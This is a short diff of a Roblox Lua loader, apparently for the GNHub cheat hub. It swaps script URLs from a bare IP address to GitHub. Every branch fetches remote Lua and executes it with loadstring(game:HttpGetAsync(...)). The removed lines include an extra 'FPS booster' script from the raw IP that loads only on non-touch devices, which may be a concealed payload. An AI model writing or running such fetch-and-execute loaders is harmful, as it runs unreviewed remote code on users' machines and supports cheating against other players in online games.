@@ -3,15 +3,9 @@ if not game:IsLoaded() then
 end
 
 if game.PlaceId == 4639625707 then
-    loadstring(game:HttpGetAsync("http://45.146.255.5:8100/War8834839T39oon.lua"))()
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/nici002018/GNHub/master/Games/War%20Tycoon%20-%20GNHub.lua"))()
 elseif game.PlaceId == 286090429 then
-    loadstring(game:HttpGetAsync("http://45.146.255.5:8100/A42n134l.lua"))()
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/nici002018/GNHub/master/Games/Arsenal%20-%20GNHub.lua"))()
 else
-    loadstring(game:HttpGetAsync("http://45.146.255.5:8100/Uni377629a23l.lua"))()
-end
-
-local UserInputService = game:GetService("UserInputService")
-
-if not UserInputService.TouchEnabled then
-    loadstring(game:HttpGet("http://45.146.255.5:8100/UWPFPSBooster.lua"))()
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/nici002018/GNHub/master/Games/Universal.lua"))()
 end
